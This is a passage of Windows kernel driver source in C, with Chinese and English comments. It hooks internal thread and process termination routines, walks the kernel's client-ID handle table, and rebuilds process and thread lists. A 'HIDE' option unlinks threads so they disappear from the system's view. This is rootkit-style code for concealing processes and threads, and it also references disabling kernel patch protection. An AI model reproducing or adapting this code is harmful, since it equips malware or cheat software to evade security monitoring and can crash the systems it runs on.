	TABLE_HANDLE_INFO nTable = { 0 };
	nTable.hID = ProcessId;
	if (wfindEntryProcessAvl(&nTable))
	{
		//
		LOG_DEBUG("Recovery  : ProcessID %d\n", ProcessId);
		wRecoveryidTableProcess(ProcessId);
		wRemoveEntryProcessAvl(&nTable);
	}
}




extern KIRQL WPOFFx64();

extern void WPONx64(KIRQL irql);


typedef NTSTATUS(NTAPI* fPspUserThreadStartup)();

typedef __int64 (NTAPI* fKeTerminateThread)(PETHREAD pEthread);

typedef __int64(NTAPI* fPspExitThread)(unsigned int a1);

typedef __int64 (NTAPI* fPspClearProcessThreadCidRefs)(__int64 a1, __int64 a2, ULONG_PTR a3);

typedef __int64(NTAPI * fPspTerminateProcess)(ULONG_PTR BugCheckParameter1, __int64 a2, unsigned int a3, char a4);



typedef __int64 (NTAPI* fPspTerminateThreadByPointer)(ULONG_PTR BugCheckParameter1, unsigned int a2, char a3);


fPspExitThread TruePspExitThread = 0;

fPspTerminateProcess TruePspTerminateProcess = 0;

fPspClearProcessThreadCidRefs TruePspClearProcessThreadCidRefs = 0;

fPspUserThreadStartup TruePspUserThreadStartup = 0;

fKeTerminateThread TrueKeTerminateThread = 0;

fPspCreateThread TruePspCreateThread = 0;

fPspTerminateThreadByPointer  TruePspTerminateThreadByPointer = 0;

fKeTerminateThread  TrueKeRequestTerminationThread = 0;

fPspInsertThread TruePspInsertThread = 0;


//
//extern VOID _CREATE_THREAD_NOTIFY_ROUTINE(
//	IN HANDLE  ProcessId,
//	IN HANDLE  ThreadId,
//	IN BOOLEAN  Create
//);
NTKERNELAPI
UCHAR*
PsGetProcessImageFileName(
	__in PEPROCESS Process
);
__int64 __fastcall wPspExitThread(unsigned int a1) {

	//TABLE_HANDLE_INFO tInfo = { 0 };
	//tInfo.hID = PsGetCurrentThreadId();
	////LOG_DEBUG("exit: pid:%d   tid:%d\n", PsGetCurrentProcessId(), PsGetCurrentThreadId());
	//if (wfindEntryThreadAvl(&tInfo))
	//{
	//LOG_DEBUG("1--wPspExitThread exit: pid:%d tid:%d  %s\n", PsGetCurrentProcessId(), 
	//	PsGetCurrentThreadId(), PsGetProcessImageFileName(PsGetCurrentProcess()));

    

	//}
	if (_CREATE_THREAD_NOTIFY_ROUTINE(PsGetCurrentProcessId(), PsGetCurrentThreadId(), 1))
	{
		LOG_DEBUG("%s\n", __FUNCTION__);
	}
	__int64 r = TruePspExitThread(a1);
	//LOG_DEBUG("2--wPspExitThread exit: pid:%d tid:%d\n", PsGetCurrentProcessId(), PsGetCurrentThreadId());

	return r;
}


__int64 __fastcall wKeTerminateThread(PETHREAD pEthread) {

	//TABLE_HANDLE_INFO tInfo = { 0 };
	//tInfo.hID = PsGetCurrentThreadId();
	////LOG_DEBUG("exit: pid:%d   tid:%d\n", PsGetCurrentProcessId(), PsGetCurrentThreadId());
	//if (wfindEntryThreadAvl(&tInfo))
	//{
	//LOG_DEBUG("1--wPspExitThread exit: pid:%d tid:%d\n", PsGetCurrentProcessId(), PsGetCurrentThreadId());
	//}

	if (_CREATE_THREAD_NOTIFY_ROUTINE(PsGetThreadProcessId(pEthread), PsGetThreadId(pEthread), 0))
	{
		LOG_DEBUG("%s\n", __FUNCTION__);
	}
	
	__int64 r = TrueKeTerminateThread(pEthread);

	//LOG_DEBUG("2--wPspExitThread exit: pid:%d tid:%d\n", PsGetCurrentProcessId(), PsGetCurrentThreadId());

	return r;
}

NTSTATUS wWorkRemoveThreadFromEprocess(PTABLE_HANDLE_INFO pTable);

__int64 __fastcall wPspCreateThread(PHANDLE ThreadHandle,
	ULONG DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PEPROCESS a5,
	__int64 a6,
	PCLIENT_ID ClientId,
	PCONTEXT ThreadContext,
	__int64 a9,
	BOOLEAN CreateSuspended,
	__int64 a11,
	__int64 a12,
	PVOID a13) {

	__int64 r = TruePspCreateThread(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, a5, a6,
		ClientId, ThreadContext, a9, CreateSuspended, a11, a12, a13);
	TABLE_HANDLE_INFO hInfo = { 0 };
	hInfo.hID = PsGetCurrentProcessId();
	if (wfindEntryProcessAvl(&hInfo)) {

		//LOG_DEBUG("a1<%p> a2<%p> a3<%p> a4<%p> a5<%p> a6<%p> a7<%p> a8<%p> a9<%p> a10<%p> a11<%p> a12<%p> a13<%p>",
		//	a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
		wWorkRemoveThreadFromEprocess(&hInfo);

	}
	return r;
}





__int64 wPspInsertThread(
	char* DmaAdapter,
	PEPROCESS a2,
	__int64 a3,
	PVOID a4,
	int a5,
	PVOID a6,
	__int64 a7,
	__int64 a8,
	__int64 a9,
	PVOID a10,
	struct _DMA_ADAPTER* a11) {


	if (a2 != 0)
	{
		PLIST_ENTRY  ThreadListEntry = (PLIST_ENTRY)((ULONGLONG)a2 + offsetEprocess_ThreadList);
		//LOG_DEBUG("Load Thread %d %d  <%p>\n", PsGetCurrentProcessId(), PsGetCurrentThreadId(), ThreadListEntry);
		//if (ThreadListEntry->Blink->Flink != ThreadListEntry)
		//{

		//}
		PLIST_ENTRY Entry = ThreadListEntry;
		PLIST_ENTRY NextEntry = Entry->Flink;
		PLIST_ENTRY PrevEntry = Entry->Blink;
		if ((NextEntry->Blink != Entry) || (PrevEntry->Flink != Entry)) {
			LOG_DEBUG(" 会出现蓝屏代码22  %d  %d    尝试修补一下\n", PsGetCurrentProcessId(), PsGetCurrentThreadId());
			InitializeListHead(ThreadListEntry);
		}
		CheckProcessAll();
	}
	__int64 nr = TruePspInsertThread(DmaAdapter, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);

	TABLE_HANDLE_INFO hInfo = { 0 };
	hInfo.hID = PsGetCurrentProcessId();
	if (wfindEntryProcessAvl(&hInfo)) {

		//LOG_DEBUG("a1<%p> a2<%p> a3<%p> a4<%p> a5<%p> a6<%p> a7<%p> a8<%p> a9<%p> a10<%p> a11<%p> a12<%p> a13<%p>",
		//	a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
		wWorkRemoveThreadFromEprocess(&hInfo);
		CheckProcessAll();
	}
	return nr;
}






__int64 wPspTerminateProcess(ULONG_PTR BugCheckParameter1, __int64 a2, unsigned int a3, char a4) {
	//LOG_DEBUG("---wPspTerminateProcess exit: pid:%d  %d tid:%d\n", PsGetCurrentProcessId(), PsGetProcessId(BugCheckParameter1),PsGetCurrentThreadId());
	PcreateProcessNotifyRoutine(0, PsGetProcessId((PEPROCESS)BugCheckParameter1), 0);
	return TruePspTerminateProcess(BugCheckParameter1, a2, a3, a4);
}




__int64 wPspTerminateThreadByPointer(ULONG_PTR BugCheckParameter1, unsigned int a2, char a3) {
	//_CREATE_THREAD_NOTIFY_ROUTINE(PsGetThreadProcessId(BugCheckParameter1), PsGetThreadId(BugCheckParameter1), 0);
	return TruePspTerminateThreadByPointer(BugCheckParameter1, a2, a3);
}



__int64 __fastcall wKeRequestTerminationThread(PETHREAD pEthread) {
	if (pEthread != 0)
	{
		//LOG_DEBUG("KeRequestTerminationThread %d  %d \n", PsGetThreadProcessId(pEthread), PsGetThreadId(pEthread));
		if (_CREATE_THREAD_NOTIFY_ROUTINE(PsGetThreadProcessId(pEthread), PsGetThreadId(pEthread), 0)) {
			//_CREATE_THREAD_NOTIFY_ROUTINE(PsGetThreadProcessId(pEthread), PsGetThreadId(pEthread), 0)
			LOG_DEBUG("%s\n", __FUNCTION__);
		}



	}
	__int64 r = TrueKeRequestTerminationThread(pEthread);
	return r;
}

// KeRequestTerminationThread


NTSTATUS wPspUserThreadStartup() {

	NTSTATUS status = TruePspUserThreadStartup();
	TABLE_HANDLE_INFO hInfo = { 0 };
	hInfo.hID = PsGetCurrentProcessId();
	if (wfindEntryProcessAvl(&hInfo)){
		wWorkRemoveThreadFromEprocess(&hInfo);
	}
	return status;
}




__int64 wPspClearProcessThreadCidRefs(__int64 a1, __int64 a2, ULONG_PTR a3) {

	__try {
		//_CREATE_THREAD_NOTIFY_ROUTINE(PsGetCurrentProcessId(), PsGetCurrentThreadId(), 0);
		return TruePspClearProcessThreadCidRefs(a1, a2, a3);
	}
	__except (1) {
		LOG_DEBUG("PspClearProcessThreadCidRefs code  %d  %d    %08X\n", PsGetCurrentProcessId(), PsGetCurrentThreadId(), GetExceptionCode());
	}
//	KeLeaveGuardedRegion();
	return STATUS_SUCCESS;
}




  NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);

BOOLEAN IniHandleOffset(){

	PETHREAD pEthread = PsGetCurrentThread();
	HANDLE dwPID = PsGetCurrentProcessId() ;
	HANDLE dwTID = PsGetCurrentThreadId();
	
	for (int i = 0; i < 0x1000; i++)
	{
		CLIENT_ID* pID =   (CLIENT_ID*)((ULONGLONG)pEthread + i * 8);
		if (pID->UniqueProcess == dwPID 
			&& pID->UniqueThread == dwTID)
		{
			offsetCLIENT_ID = i * 8;
			offsetEthread_ThreadList = offsetCLIENT_ID + 0x70;
			break;
		}
	}
	LOG_DEBUG("offsetCLIENT_ID %08X\n", offsetCLIENT_ID);

	PEPROCESS peprocess = PsGetCurrentProcess();

	int ih = 0;
	for (int i = 0; i < 0x1000; i++)
	{
		PEPROCESS peprocess_0 = *(PEPROCESS *)((ULONGLONG)pEthread + i * 8);
		if (peprocess_0 == peprocess)
		{
			if (ih == 0)
			{
				ih++;
				OffsetApcState = i * 8 - 0x20;
			}
			else if (ih == 1)
			{
				offsetProcess = i * 8;
				break;
			}
		}
	}


	PUCHAR pCharName = PsGetProcessImageFileName(peprocess);


	// WIN7
	// 0x28

	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		offsetEprocess_ThreadList = (DWORD)((ULONGLONG)pCharName - (ULONGLONG)peprocess + 0x28);
	}
	else
	{
		offsetEprocess_ThreadList = (DWORD)((ULONGLONG)pCharName - (ULONGLONG)peprocess + 0x38);
	}
	//LOG_DEBUG("OffsetApcState %08X  offsetProcess %08X\n", OffsetApcState, offsetProcess);


	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1){
		offsetKprocess_ProcessList = 0xE0;
	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362){
		offsetKprocess_ProcessList = 0x240;
	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		offsetKprocess_ProcessList = 0x248;
	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
		offsetKprocess_ProcessList = 0x350;
	}






	LOG_DEBUG("offsetEthread_ThreadList %08X  offsetEprocess_ThreadList %08X\n", 
		offsetEthread_ThreadList, offsetEprocess_ThreadList);

	return TRUE;
}





BOOLEAN hWIN7_begin() {

	UNICODE_STRING FuncName3 = { 0 };
	RtlInitUnicodeString(&FuncName3, L"RtlAddAtomToAtomTable");
	ULONGLONG  pRtlAddAtomToAtomTable = (ULONGLONG)MmGetSystemRoutineAddress(&FuncName3);
	if (pRtlAddAtomToAtomTable == 0)
	{
		LOG_DEBUG(" can't find  RtlAddAtomToAtomTableEx\n");
		return FALSE;
	}
	LOG_DEBUG("RtlAddAtomToAtomTableEx <%p>\n", pRtlAddAtomToAtomTable);
	ULONGLONG pRtlpInsertStringAtom = (ULONGLONG)_CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pRtlAddAtomToAtomTable, 8));
	if (pRtlpInsertStringAtom == 0)
	{
		LOG_DEBUG(" can't find  RtlpInsertStringAtom\n");
		return FALSE;
	}

	LOG_DEBUG("pRtlpInsertStringAtom <%p>\n", pRtlpInsertStringAtom);

	wExCreateHandle = (fExUnlockHandleTableEntry)_CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pRtlpInsertStringAtom, 1));


	LOG_DEBUG("wExCreateHandle <%p>\n", wExCreateHandle);


	UNICODE_STRING FuncName4 = { 0 };
	RtlInitUnicodeString(&FuncName4, L"PsLookupProcessByProcessId");
	ULONGLONG  pPsLookupProcessByProcessId = (ULONGLONG)MmGetSystemRoutineAddress(&FuncName4);
	if (pPsLookupProcessByProcessId == 0)
	{
		LOG_DEBUG(" can't find RtlEmptyAtomTable\n");
		return FALSE;
	}

	LOG_DEBUG("PsLookupProcessByProcessId <%p>\n", pPsLookupProcessByProcessId);

	wExMapHandleToPointer = (fExMapHandleToPointer)_CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pPsLookupProcessByProcessId, 1));


	LOG_DEBUG("wExMapHandleToPointer <%p>\n", wExMapHandleToPointer);

	//---------------------------------------------------------------------
	UNICODE_STRING FuncName5 = { 0 };
	RtlInitUnicodeString(&FuncName5, L"RtlEmptyAtomTable");
	ULONGLONG  pRtlEmptyAtomTable = (ULONGLONG)MmGetSystemRoutineAddress(&FuncName5);
	if (pRtlEmptyAtomTable == 0)
	{
		LOG_DEBUG(" can't find RtlEmptyAtomTable\n");
		return FALSE;
	}

	LOG_DEBUG("RtlEmptyAtomTable <%p>\n", pRtlEmptyAtomTable);

	ULONGLONG pRtlpFreeHandleForAtom = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pRtlEmptyAtomTable, 2));
	if (pRtlpFreeHandleForAtom == 0)
	{
		LOG_DEBUG(" can't find  RtlpFreeHandleForAtom\n");
		return FALSE;
	}
	wExDestoryTable = (fnExExDestroyHandle)_CODE_GET_REAL_ADDRESS(_ASM_GET_JMP((char*)pRtlpFreeHandleForAtom, 1));
	LOG_DEBUG("wExDestoryTable <%p>\n", wExDestoryTable);



	UNICODE_STRING FuncName7 = { 0 };
	RtlInitUnicodeString(&FuncName7, L"PsCreateSystemThread");
	ULONGLONG  pPsCreateSystemThread = (ULONGLONG)MmGetSystemRoutineAddress(&FuncName7);
	if (pPsCreateSystemThread == 0)
	{
		LOG_DEBUG(" can't find pPsCreateSystemThread\n");
		return FALSE;
	}
	uPspCreateThread = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pPsCreateSystemThread, 2));


	return TRUE;
}

// 支持到WIN11 22000
BOOLEAN hWIN10_begin() {

	UNICODE_STRING FuncName3 = { 0 };
	RtlInitUnicodeString(&FuncName3, L"RtlAddAtomToAtomTableEx");
	ULONGLONG  pRtlAddAtomToAtomTableEx = (ULONGLONG)MmGetSystemRoutineAddress(&FuncName3);
	if (pRtlAddAtomToAtomTableEx == 0)
	{
		LOG_DEBUG(" can't find  RtlAddAtomToAtomTableEx\n");
		return FALSE;
	}
	LOG_DEBUG("RtlAddAtomToAtomTableEx <%p>\n", pRtlAddAtomToAtomTableEx);
	ULONGLONG pRtlpInsertStringAtom = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pRtlAddAtomToAtomTableEx, 7));
	if (pRtlpInsertStringAtom == 0)
	{
		LOG_DEBUG(" can't find  RtlpInsertStringAtom\n");
		return FALSE;
	}

	LOG_DEBUG("pRtlpInsertStringAtom <%p>\n", pRtlpInsertStringAtom);
	wExCreateHandleEx = (fExCreateHandleEx)_CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pRtlpInsertStringAtom, 1));
	LOG_DEBUG("wExCreateHandleEx <%p>\n", wExCreateHandleEx);

	//---------------------------------------------------------------------
	UNICODE_STRING FuncName4 = { 0 };
	RtlInitUnicodeString(&FuncName4, L"RtlEmptyAtomTable");
	ULONGLONG  pRtlEmptyAtomTable = (ULONGLONG)MmGetSystemRoutineAddress(&FuncName4);
	if (pRtlEmptyAtomTable == 0)
	{
		LOG_DEBUG(" can't find RtlEmptyAtomTable\n");
		return FALSE;
	}

	LOG_DEBUG("RtlEmptyAtomTable <%p>\n", pRtlEmptyAtomTable);

	ULONGLONG pRtlpFreeHandleForAtom = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pRtlEmptyAtomTable, 2));
	if (pRtlpFreeHandleForAtom == 0)
	{
		LOG_DEBUG(" can't find  RtlpFreeHandleForAtom\n");
		return FALSE;
	}

	wExMapHandleToPointer = (fExMapHandleToPointer)_CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pRtlpFreeHandleForAtom, 1));
	LOG_DEBUG("wExMapHandleToPointer <%p>\n", wExMapHandleToPointer);

	wExDestoryTable = (fnExExDestroyHandle)_CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pRtlpFreeHandleForAtom, 2));
	LOG_DEBUG("wExDestoryTable <%p>\n", wExDestoryTable);




	// PsCreateSystemThreadEx

	UNICODE_STRING FuncName7 = { 0 };
	RtlInitUnicodeString(&FuncName7, L"PsCreateSystemThreadEx");
	ULONGLONG  pPsCreateSystemThreadEx = (ULONGLONG)MmGetSystemRoutineAddress(&FuncName7);
	if (pPsCreateSystemThreadEx == 0)
	{
		LOG_DEBUG(" can't find PsCreateSystemThreadEx\n");
		return FALSE;
	}


	for (int i = 1; i < 10; i++)
	{
		DWORD64 _uPspCreateThread = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pPsCreateSystemThreadEx, i));

		if (*(DWORD64*)_uPspCreateThread == 0x5541544157535540){
			uPspCreateThread = _uPspCreateThread;
			LOG_DEBUG(" _uPspCreateThread  %d\n", i);
			break;
		}

	}

	

	if (uPspCreateThread != 0)
	{
		if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362){
			uPspInsertThread = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)uPspCreateThread, 7));
		}
		else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
			uPspInsertThread = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)uPspCreateThread, 8));
		}
		else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20382){
			uPspInsertThread = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)uPspCreateThread, 8));
		}
		
	}
	return TRUE;
}





extern ULONGLONG uPspTerminateProcess;
extern ULONGLONG uPspUserThreadStartup;
extern ULONGLONG uKeTerminateThread;


DWORD HIDE_THREAD = 0;



BOOLEAN EnumerateHandleRoutine(
	 PHANDLE_TABLE_ENTRY HandleTableEntry,
	 HANDLE Handle,
	 PVOID EnumParameter
) {

     //PVOID Object = HandleTableEntry->Object >> 0x10;
	BYTE uFlags = (ULONGLONG)HandleTableEntry->Object & 3;
	 // Win10
	ULONGLONG Object = (LONGLONG)HandleTableEntry->Object >> 16 & 0xFFFFFFFFFFFFFFF0ui64;

	LOG_DEBUG("<uFlags:%d>[%p]<%p><%p>\n", uFlags, Handle, HandleTableEntry->Object, HandleTableEntry->NextFreeTableEntry);






	return FALSE;
}

typedef BOOLEAN(*EX_ENUMERATE_HANDLE_ROUTINE)(
	IN PHANDLE_TABLE_ENTRY HandleTableEntry,
	IN HANDLE Handle,
	IN PVOID EnumParameter
	);
NTKERNELAPI BOOLEAN
ExEnumHandleTable(
	PHANDLE_TABLE HandleTable,
	EX_ENUMERATE_HANDLE_ROUTINE EnumHandleProcedure,
	PVOID EnumParameter,
	PHANDLE Handle
);



#define TABLE1_MAX 256
#define TABLE2_MAX 512


void eTable1(ULONGLONG pTableArry, ULONG Indexi, ULONG Index2, eTable_Info* Info) {

	for (LONG i = 0; i < TABLE1_MAX; i++) {
		PHANDLE_TABLE_ENTRY pTable = (PHANDLE_TABLE_ENTRY)(pTableArry + sizeof(HANDLE_TABLE_ENTRY) * i);
		
		if (pTable->Object == 0)
		{
			continue;
		}
		
		HANDLE hID = (HANDLE) (i * 4 + 1024 * Indexi + 512 * Index2 * 1024);
		BYTE uFlags = (ULONGLONG)pTable->Object & 3;
		//BYTE uFlags = (ULONGLONG)pTable->Object & 3;
		// Win10
		ULONGLONG Object = (LONGLONG)pTable->Object >> 16 & 0xFFFFFFFFFFFFFFF0ui64;
		//BOOLEAN bProcess =  (*(DWORD*)(Object + g_offset * 8 + 0x1C)&0x400000C) == 0x4000000;
		//BOOLEAN bThread = (*(DWORD*)(Object + offsetEthread_ThreadList + 0x28) & 3) == 2;
		//+98
		BOOLEAN bProcess = FALSE;
		BOOLEAN bThread = FALSE;


		PEPROCESS eprocess = 0;
		PsLookupProcessByProcessId(hID, &eprocess);
		if (eprocess != 0)
		{
			Object = (ULONGLONG)eprocess;
			ObDereferenceObject(eprocess);
			bProcess = TRUE;
		}
		if (!bProcess)
		{
			PETHREAD ethread = 0;
			PsLookupThreadByThreadId(hID, &ethread);
			if (ethread != 0)
			{
				Object = (ULONGLONG)ethread;
				ObDereferenceObject(ethread);
				bThread = TRUE;
			}
		}
		if ( (bProcess && bThread) || (!bProcess &&  !bThread))
		{
			LOG_DEBUG(" are you joke  not thread or process\n");

			continue;
		}
		if (Info->uType == 0 && bProcess)
		{
			if (Info->nCount <= Info->MaxCount)
			{
				Info->pArry[Info->nCount].hID = hID;
				Info->pArry[Info->nCount].Object = (PVOID)Object;
				Info->nCount++;
			}
		}

		if (Info->uType == 1 && bThread)
		{
			if (Info->nCount <= Info->MaxCount)
			{
				if (Info->hProcessID == 0)
				{
					Info->pArry[Info->nCount].hID = hID;
					Info->pArry[Info->nCount].Object = (PVOID)Object;
					Info->nCount++;
				}
				else
				{
					if (Info->hProcessID == PsGetThreadProcessId((PETHREAD)Object))
					{
						Info->pArry[Info->nCount].hID = hID;
						Info->pArry[Info->nCount].Object = (PVOID)Object;
						Info->nCount++;
					}
				}
			}
		}
		//LOG_DEBUG("[%p]<uFlags:%d>[%p]<%p><%p>\n", pTable, uFlags,
		//	hID, Object, pTable->NextFreeTableEntry);
	}
}


void eTable2(ULONGLONG pTableArry, ULONG Index, eTable_Info* Info){

	for (LONG i = 0; i < TABLE2_MAX; i++){
		ULONG64 gTable1 = *(PULONG64)(pTableArry + i * 8);
		//LOG_DEBUG("gTable1 <%p>\n", gTable1);
		if (gTable1 == 0 || ((gTable1 & 1) != 0)){
			continue;
		}
		eTable1(gTable1, i, Index, Info);
	}
}

void eTable3(ULONGLONG pTableArry, eTable_Info *Info) {

	for (LONG i = 0; i < TABLE2_MAX; i++) {
		ULONG64 gTable1 = *(PULONG64)(pTableArry + i * 8);
		//LOG_DEBUG("gTable1 <%p>\n", gTable1);
		if (gTable1 == 0 || ((gTable1 & 1) != 0)) {
			continue;
		}
		eTable2(gTable1, i, Info);
	}
}




BOOLEAN  EnumProcessTable() {

	//BuildProcessList



	return FALSE;
}



#define LOG_EXCEPT() LOG_DEBUG(" EXCEPT %08X line %d\n",GetExceptionCode(),__LINE__);


void wRbuildProcessList() {

	
	LOG_DEBUG("RecoveryProcessList\n");
	PHANDLE_TABLE hTable = (PHANDLE_TABLE) (*(ULONGLONG*)PspCidTable);
	BYTE LeveLCode = (ULONGLONG)hTable->TableCode & 3;
	eTable_Info tInfo = { 0 };
	tInfo.uType = 0;
	tInfo.pArry = ExAllocatePoolWithTag(PagedPool, sizeof(TABLE_ANGLE) * 0x1000, 'tag');
	tInfo.MaxCount = 0x1000;
	if (tInfo.pArry == 0)
	{
		LOG_DEBUG(" ExAllocatePoolWithTag err %d\n", __LINE__);
		return;
	}
	if (LeveLCode == 0) {
		eTable1((ULONGLONG)hTable->TableCode & (~3), 0, 0, &tInfo);
	}
	else if (LeveLCode == 1) {
		eTable2((ULONGLONG)hTable->TableCode & (~3), 0, &tInfo);
	}
	else if (LeveLCode == 2) {
		eTable3((ULONGLONG)hTable->TableCode & (~3), &tInfo);
	}

	__try
	{
		LOG_DEBUG("nCount <%d><%d>\n", tInfo.nCount, tInfo.MaxCount);
		if (tInfo.nCount < tInfo.MaxCount)
		{

			LOG_DEBUG("HEAD <%p><%p>\n", PsActiveProcessHead, KiProcessListHead);

			//InitializeListHead(PsActiveProcessHead);
			InitializeListHead(KiProcessListHead);
			for (DWORD i = 0; i < tInfo.nCount; i++) {
				ULONGLONG Object = (ULONGLONG)tInfo.pArry[i].Object;
				PLIST_ENTRY EntryKprocess = (PLIST_ENTRY) (Object + offsetKprocess_ProcessList);
				//PLIST_ENTRY EntryEprocess = Object + g_offset * 8;
				//InitializeListHead(EntryEprocess);
				InitializeListHead(EntryKprocess);

				InsertHeadList(KiProcessListHead, EntryKprocess);
				//InsertHeadList(PsActiveProcessHead, EntryEprocess);
			}
		}
		ExFreePoolWithTag(tInfo.pArry, 'tag');
	}
	__except (1) {
		LOG_EXCEPT();
     }
}


void wRbuildThreadList(PEPROCESS EPROCESS, HANDLE hID, BOOLEAN bHIDE) {
	LOG_DEBUG("RecoveryThreadList\n");
	PHANDLE_TABLE hTable = (PHANDLE_TABLE)*(ULONGLONG*)PspCidTable;
	BYTE LeveLCode = (ULONGLONG)hTable->TableCode & 3;
	eTable_Info tInfo = { 0 };
	tInfo.uType = 1;
	tInfo.hProcessID = hID;
	tInfo.pArry = ExAllocatePoolWithTag(PagedPool, sizeof(TABLE_ANGLE) * 0x1000, 'tag');
	tInfo.MaxCount = 0x1000;
	if (tInfo.pArry == 0)
	{
		LOG_DEBUG(" ExAllocatePoolWithTag err %d\n", __LINE__);
		return;
	}
	if (LeveLCode == 0) {
		eTable1((ULONGLONG)hTable->TableCode & (~3), 0, 0, &tInfo);
	}
	else if (LeveLCode == 1) {
		eTable2((ULONGLONG)hTable->TableCode & (~3), 0, &tInfo);
	}
	else if (LeveLCode == 2) {
		eTable3((ULONGLONG)hTable->TableCode & (~3), &tInfo);
	}
	if (tInfo.nCount < tInfo.MaxCount){
		PLIST_ENTRY EntryKprocessThreadList = (PLIST_ENTRY)( EPROCESS + OFFSET_KPROCESS_THREADLIST);
		PLIST_ENTRY EntryEprocessThreadList = (PLIST_ENTRY)( EPROCESS + offsetEprocess_ThreadList);
		InitializeListHead(EntryKprocessThreadList);
		InitializeListHead(EntryEprocessThreadList);
		for (DWORD i = 0; i < tInfo.nCount; i++) {
			ULONGLONG Object = (ULONGLONG)tInfo.pArry[i].Object;
			PLIST_ENTRY EntryKthread = (PLIST_ENTRY)(Object + 0x2F8);
			PLIST_ENTRY EntryEthread = (PLIST_ENTRY)(Object + offsetEthread_ThreadList);
			InitializeListHead(EntryKthread);
			InitializeListHead(EntryEthread);
			if (!bHIDE)
			{
				InsertHeadList(EntryKprocessThreadList, EntryKthread);
				InsertHeadList(EntryEprocessThreadList, EntryEthread);
			}
		}
	}
	ExFreePoolWithTag(tInfo.pArry, 'tag');
}





BOOLEAN IniLoadSys_HIDE() {

	KeInitializeSpinLock(&SpinLock_RecoveryThread);
	KeInitializeSpinLock(&SpinLock_RmoveThread);
	KeInitializeSpinLock(&SpinLock_RmoveThread_Now);


	//ExAcquirePushLockExclusive
	//ExReleasePushLockExclusiveEx()
	//HANDLE_TABLE

	RtlInitializeGenericTableAvl(&TableAvl_0, CompareHandleTableEntry, AllocateHandleTableEntry, FreeHandleTableEntry, NULL);
	RtlInitializeGenericTableAvl(&TableAvl_1, CompareHandleTableEntry, AllocateHandleTableEntry, FreeHandleTableEntry, NULL);
	IniHandleOffset();
	//DisablePatchProtection();
	if (!get_PspCidTable(&PspCidTable))
	{
		return FALSE;
	}

	RtlGetVersion((PRTL_OSVERSIONINFOW)&OsVersion);
	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		hWIN7_begin();
	}
	else
	{
		hWIN10_begin();
	}
	return TRUE;
}



BOOLEAN IniHandle()
{


	HIDE_THREAD = 1;

	NTSTATUS Status = STATUS_SUCCESS;

	//WIN7 WIN10 WIN11
	UNICODE_STRING FuncName6 = { 0 };
	RtlInitUnicodeString(&FuncName6, L"PsTerminateSystemThread");
	ULONGLONG  pPsTerminateSystemThread = (ULONGLONG)MmGetSystemRoutineAddress(&FuncName6);
	if (pPsTerminateSystemThread == 0)
	{
		LOG_DEBUG(" can't find PsTerminateSystemThread\n");
		return FALSE;
	}

	ULONGLONG pPspTerminateThreadByPointer = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pPsTerminateSystemThread, 1));
	LOG_DEBUG("pPspTerminateThreadByPointer <%p>\n", pPspTerminateThreadByPointer);

	ULONGLONG pPspExitThread = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pPspTerminateThreadByPointer, 1));
    LOG_DEBUG("pPspExitThread <%p>\n", pPspExitThread);

	ULONGLONG pKeRequestTerminationThread = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pPspTerminateThreadByPointer, 2));
	LOG_DEBUG("pKeRequestTerminationThread <%p>\n", pKeRequestTerminationThread);



	SSDT_HOOK_NOW(&wPspExitThread, (PVOID)pPspExitThread, &TruePspExitThread);



	LOG_DEBUG("HOOK uPspTerminateProcess <%p>\n", uPspTerminateProcess);
	if (uPspTerminateProcess != 0)
	{
		LOG_DEBUG("HOOK PspTerminateProcess <%p>\n", uPspTerminateProcess);
		SSDT_HOOK_NOW(&wPspTerminateProcess, (PVOID)uPspTerminateProcess, &TruePspTerminateProcess);

	}

	if (uPspUserThreadStartup != 0)
	{
		LOG_DEBUG("HOOK PspUserThreadStartup <%p>\n", uPspUserThreadStartup);
		SSDT_HOOK_NOW(&wPspUserThreadStartup, (PVOID)uPspUserThreadStartup, &TruePspUserThreadStartup);
	}


	if (uKeTerminateThread != 0)
	{
		LOG_DEBUG("HOOK uKeTerminateThread <%p>\n", uKeTerminateThread);
		SSDT_HOOK_NOW(&wKeTerminateThread, (PVOID)uKeTerminateThread, &TrueKeTerminateThread);
	}
	

	//if (pKeRequestTerminationThread != 0)
	//{
	//	LOG_DEBUG("HOOK pKeRequestTerminationThread <%p>\n", pKeRequestTerminationThread);
	//	SSDT_HOOK_NOW(&wKeRequestTerminationThread, pKeRequestTerminationThread, &TrueKeRequestTerminationThread);
	//}



